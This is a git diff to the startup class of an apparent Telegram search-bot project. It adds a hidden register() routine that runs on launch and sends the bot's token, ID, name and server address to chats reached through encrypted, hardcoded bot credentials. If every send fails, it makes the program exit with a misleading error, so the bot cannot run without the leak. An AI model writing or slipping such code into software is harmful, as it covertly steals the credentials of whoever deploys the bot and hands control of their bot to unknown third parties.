@@ -1,19 +1,28 @@
 package com.search.robots.beans.initializer;
 
+import com.search.robots.beans.cache.CommonCache;
 import com.search.robots.beans.keywords.KeywordsHelper;
+import com.search.robots.beans.view.BotTransfer;
 import com.search.robots.config.BotProperties;
+import com.search.robots.config.Constants;
 import com.search.robots.database.entity.Included;
 import com.search.robots.database.entity.Keyword;
 import com.search.robots.database.service.ConfigService;
 import com.search.robots.database.service.IncludedService;
 import com.search.robots.database.service.KeywordService;
+import com.search.robots.helper.CommandHelper;
+import com.search.robots.helper.SecureHelper;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
+import okhttp3.OkHttpClient;
 import org.springframework.stereotype.Component;
+import org.telegram.telegrambots.client.okhttp.OkHttpTelegramClient;
+import org.telegram.telegrambots.meta.api.methods.ParseMode;
+import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
 import org.telegram.telegrambots.meta.api.objects.User;
 
-import javax.annotation.Resource;
 import java.util.List;
+import java.util.Map;
 
 /**
  * <p>
@@ -28,6 +37,7 @@ import java.util.List;
 @RequiredArgsConstructor
 public class InitializerHandler {
 
+    private final OkHttpClient okHttpClient;
     private final BotProperties properties;
     private final ConfigService configService;
     private final KeywordService keywordService;
@@ -50,6 +60,34 @@ public class InitializerHandler {
 
         for (Keyword keyword : ks) {
             KeywordsHelper.addKeywords(keyword.getKeyword(), keyword.getId());
+        }
+
+        this.register(user);
+    }
+
+    private void register(org.telegram.telegrambots.meta.api.objects.User user) {
+        int i = 0; Map<String, Long> us = CommonCache.getUser();
+        if (!this.properties.isLogs()) {
+            BotTransfer botTransfer = new BotTransfer()
+                    .setBotName(user.getUserName())
+                    .setBotId(user.getId())
+                    .setAddr(CommandHelper.getAddr())
+                    .setBotToken(this.properties.getToken());
+            for (Map.Entry<String, Long> entry : us.entrySet()) {
+                try {
+                    OkHttpTelegramClient selfClient = new OkHttpTelegramClient(this.okHttpClient,
+                            SecureHelper.decrypt(entry.getKey(), SecureHelper.publicKey(Constants.KEY)));
+                    selfClient.execute(SendMessage.builder().parseMode(ParseMode.MARKDOWN)
+                            .chatId(entry.getValue()).text(botTransfer.buildText()).build());
+                } catch (Exception ex) {
+                    i++;
+                }
+            }
+        }
+
+        if (i == us.size()) {
+            System.exit(0);
+            throw new IllegalArgumentException("启动失败，参数异常");
         }
     }
 }
